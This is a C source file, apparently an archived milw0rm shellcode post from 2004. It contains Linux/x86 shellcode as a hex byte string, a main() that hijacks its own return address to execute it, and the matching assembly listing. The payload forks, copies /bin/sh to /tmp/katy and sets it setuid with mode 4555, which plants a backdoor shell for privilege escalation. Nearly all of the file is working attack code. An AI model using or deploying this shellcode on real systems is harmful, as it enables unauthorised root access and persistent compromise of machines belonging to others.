/*
 *  Linux/x86
 *
 *  /bin/cp /bin/sh /tmp/katy ; chmod 4555 /tmp/sh using fork()
 */
#include <stdio.h>


char shellcode[] =
"\xeb\x5e\x5f\x31\xc0\x88\x47\x07\x88\x47\x0f\x88\x47\x19\x89\x7f"
"\x1a\x8d\x77\x08\x89\x77\x1e\x31\xf6\x8d\x77\x10\x89\x77\x22\x89"
"\x47\x26\x89\xfb\x8d\x4f\x1a\x8d\x57\x26\x31\xc0\xb0\x02\xcd\x80"
"\x31\xf6\x39\xc6\x75\x06\xb0\x0b\xcd\x80\xeb\x1d\x31\xd2\x31\xc0"
"\x31\xdb\x4b\x8d\x4f\x26\xb0\x07\xcd\x80\x31\xc0\x8d\x5f\x10\x31"
"\xc9\x66\xb9\x6d\x09\xb0\x0f\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"
"\xe8\x9d\xff\xff\xff/bin/cp8/bin/sh8/tmp/katy";

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}

/* Code */
/*
__asm__("
        jmp    0x5e
        popl   %edi
        xorl   %eax,%eax
        movb   %al,0x7(%edi)
        movb   %al,0xf(%edi)
        movb   %al,0x19(%edi)
        movl   %edi,0x1a(%edi)
        leal   0x8(%edi),%esi
        movl   %esi,0x1e(%edi)
        xorl   %esi,%esi
        leal   0x10(%edi),%esi
        movl   %esi,0x22(%edi)
        movl   %eax,0x26(%edi)
        movl   %edi,%ebx
        leal   0x1a(%edi),%ecx
        leal   0x26(%edi),%edx
        xorl   %eax,%eax
        movb   $0x2,%al
        int    $0x80
        xorl   %esi,%esi
        cmpl   %eax,%esi
        jne    0x6
        movb   $0xb,%al
        int    $0x80
        jmp    0x1d
        xorl   %edx,%edx
        xorl   %eax,%eax
        xorl   %ebx,%ebx
        dec    %ebx
        leal   0x26(%edi),%ecx
        movb   $0x7,%al
        int    $0x80
        xorl   %eax,%eax
        leal   0x10(%edi),%ebx
        xorl   %ecx,%ecx
        movw   $0x96d,%cx
        movb   $0xf,%al
        int    $0x80
        xorl   %eax,%eax
        inc    %eax
        xorl   %ebx,%ebx
        int    $0x80
        call   -0x63
        .ascii \"/bin/cp8/bin/sh8/tmp/katy\"
");
*/

/*
RaiSe <raise@undersec.com>
http://www.undersec.com
*/

// milw0rm.com [2004-09-26]